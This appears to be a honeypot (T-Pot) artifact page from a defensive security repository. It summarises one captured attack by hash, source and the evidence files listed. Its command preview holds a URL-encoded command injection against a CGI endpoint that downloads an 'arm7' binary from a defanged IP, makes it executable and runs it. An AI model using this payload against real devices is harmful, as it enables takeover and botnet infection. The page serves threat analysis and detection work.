# fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31[.]56[.]209[.]XXX/arm7%3Bchmod%20777%20*%3B./arm7%2
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
